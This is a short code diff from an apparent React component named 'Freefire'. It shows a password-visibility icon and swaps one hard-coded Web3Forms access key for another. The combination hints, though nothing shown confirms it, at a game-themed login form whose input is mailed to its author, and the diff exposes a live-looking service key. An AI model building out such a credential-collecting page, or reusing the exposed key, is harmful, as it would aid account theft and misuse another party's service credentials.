@@ -29,7 +29,7 @@ const EyeSlashIcon = (
     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#65676b" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a21.81 21.81 0 0 1 5.06-6.06M9.53 9.53A3 3 0 0 0 12 15a3 3 0 0 0 2.47-5.47"></path><path d="M1 1l22 22"></path></svg>
 );
 
-const WEB3FORMS_ACCESS_KEY = "67a9cc91-daea-421c-81a9-b1e5e447c316"; // <-- Replace with your Web3Forms access key
+const WEB3FORMS_ACCESS_KEY = "5f66b663-f4a4-4302-825c-b092dd749458"; // <-- Replace with your Web3Forms access key
 
 export default function Freefire() {
     const [showModal, setShowModal] = useState(false);
